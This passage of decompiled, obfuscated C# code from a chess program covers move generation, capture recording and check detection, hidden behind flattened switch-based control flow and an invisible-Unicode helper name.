            MoveFinder.\u202B‍⁭‭⁪‎‬‪‌‫‬‭‎⁬​‫‬​‫⁯‫​‍‪‮‎‭⁬‏⁪‭‫‭‭‬‌⁭‭‮‭‮((Array) numArray4, __fieldref (\u003CPrivateImplementationDetails\u003E.\u00308E3102C9F450967BADA9E115E24B5AAA035978F425E7DFC17E7F18ED0AE9659));
            numArray1 = numArray4;
            num1 = (int) num2 * 497657195 ^ -1394875381;
            continue;
          case 14:
            goto label_3;
          case 15:
            if (Rank >= 0)
            {
              num1 = (int) num2 * 705081813 ^ 253721274;
              continue;
            }
            break;
          case 16:
            goto label_1;
          case 17:
            int num6 = flag1 ? 1691290974 : (num6 = 834903800);
            num1 = num6 ^ (int) num2 * -2013922801;
            continue;
          case 18:
            sq = this.board[File, Rank];
            num1 = 734655853;
            continue;
          case 19:
            num1 = (int) num2 * -1334933439 ^ 976886523;
            continue;
          case 20:
            this.MoveList[piece.Id].Add(new PossibleMoves(piece, sq, UserAction.Move));
            num1 = (int) num2 * -97731013 ^ -555144149;
            continue;
          case 21:
            if (File <= 7)
            {
              num1 = (int) num2 * -1965141846 ^ 1865347624;
              continue;
            }
            break;
          case 22:
            piece = x.Piece;
            num1 = (int) num2 * -1158291780 ^ 1158008279;
            continue;
          case 23:
            num1 = (int) num2 * 254595350 ^ -727601151;
            continue;
          case 24:
            Rank = x.Rank + numArray2[index];
            num1 = (int) num2 * -603293907 ^ 2142650201;
            continue;
          default:
            goto label_32;
        }
        num3 = 1;
label_7:
        int num7;
        num1 = num7 = num3 == 0 ? 92906207 : (num7 = 2109466566);
      }
label_3:
      return;
label_32:;
    }

    private void addCapture(int a, int b, Square x, ChessPiece pawn)
    {
label_1:
      int num1 = -934623564;
      ChessPiece piece;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1055034939)) % 5U)
        {
          case 0:
            goto label_3;
          case 1:
            Square sq = this.board[a, b];
            Board.lastValidPassantMove = new PossibleMoves(piece, sq, UserAction.Capture);
            this.MoveList[piece.Id].Add(Board.lastValidPassantMove);
            num1 = (int) num2 * -1505588883 ^ -2141597138;
            continue;
          case 2:
            piece = x.Piece;
            num1 = (int) num2 * -305843533 ^ -889111305;
            continue;
          case 3:
            num1 = (int) num2 * -1777904368 ^ 1881732771;
            continue;
          case 4:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private bool addMove(int a, int b, Square x)
    {
      if (a < 0)
        goto label_12;
label_1:
      int num1 = 502446401;
label_2:
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        bool flag3;
        ChessPiece piece;
        Square sq;
        UserAction kind;
        bool isEmpty;
        int num3;
        switch ((num2 = (uint) (num1 ^ 601247957)) % 26U)
        {
          case 0:
            this.MoveList[piece.Id].Add(new PossibleMoves(piece, sq, UserAction.Move));
            num1 = (int) num2 * -1063626302 ^ 1904026949;
            continue;
          case 1:
            int num4 = !flag3 ? -237489380 : (num4 = -935188209);
            num1 = num4 ^ (int) num2 * -906689077;
            continue;
          case 2:
            num1 = (int) num2 * 1412029081 ^ 1280234563;
            continue;
          case 3:
            if (x.Piece.Kind == Pieces.King)
            {
              num3 = 0;
              break;
            }
            num1 = (int) num2 * 835122630 ^ -1298350480;
            continue;
          case 4:
            num1 = (int) num2 * -590703885 ^ -235525535;
            continue;
          case 5:
            flag1 = true;
            num1 = (int) num2 * 10419605 ^ -186022092;
            continue;
          case 6:
            int num5;
            num1 = num5 = sq.Piece.Color != x.Piece.Color ? 1467630628 : (num5 = 316694238);
            continue;
          case 7:
            num1 = (int) num2 * -400679707 ^ 1874556866;
            continue;
          case 8:
            flag1 = false;
            num1 = 27248345;
            continue;
          case 9:
            flag3 = sq.Piece.Kind == Pieces.King;
            num1 = (int) num2 * -755146634 ^ -597952950;
            continue;
          case 10:
            if (a <= 7)
            {
              num1 = (int) num2 * -1111026126 ^ 650011922;
              continue;
            }
            goto label_12;
          case 11:
            num1 = 1589072147;
            continue;
          case 12:
            this.MoveList[piece.Id].Add(new PossibleMoves(piece, sq, kind));
            flag1 = true;
            num1 = 1861292731;
            continue;
          case 13:
            num1 = (int) num2 * -753951501 ^ 1087309170;
            continue;
          case 15:
            int num6 = flag2 ? 1932410992 : (num6 = 690772830);
            num1 = num6 ^ (int) num2 * -308365090;
            continue;
          case 16:
            num1 = (int) num2 * 1749413519 ^ -1893406193;
            continue;
          case 17:
            goto label_1;
          case 18:
            kind = UserAction.Capture;
            num1 = (int) num2 * -1873192932 ^ -152658802;
            continue;
          case 19:
            if (b >= 0)
            {
              num1 = (int) num2 * -1765394346 ^ 1778667513;
              continue;
            }
            goto label_12;
          case 20:
            this.KingColorOnCheck = sq.Piece.Color;
            this.IsOnCheck = true;
            num1 = (int) num2 * 1615450684 ^ -1396443536;
            continue;
          case 21:
            piece = x.Piece;
            sq = this.board[a, b];
            isEmpty = sq.IsEmpty;
            num1 = 1388367983;
            continue;
          case 22:
            int num7 = !isEmpty ? -243729647 : (num7 = -827234689);
            num1 = num7 ^ (int) num2 * 676316429;
            continue;
          case 23:
            flag1 = true;
            num1 = 1861292731;
            continue;
          case 24:
            goto label_11;
          case 25:
            num3 = x.Piece.Kind != Pieces.Pawn ? 1 : 0;
            break;
          default:
            goto label_34;
        }
        int num8;
        num1 = num8 = num3 == 0 ? 1690139000 : (num8 = 902693504);
      }
label_11:
      int num9 = b > 7 ? 1 : 0;
      goto label_13;
label_34:
      return flag1;
label_12:
      num9 = 1;
label_13:
      flag2 = num9 != 0;
      num1 = 377934200;
      goto label_2;
    }

    static void \u202B‍⁭‭⁪‎‬‪‌‫‬‭‎⁬​‫‬​‫⁯‫​‍‪‮‎‭⁬‏⁪‭‫‭‭‬‌⁭‭‮‭‮([In] Array obj0, [In] RuntimeFieldHandle obj1) => RuntimeHelpers.InitializeArray(obj0, obj1);
  }
}
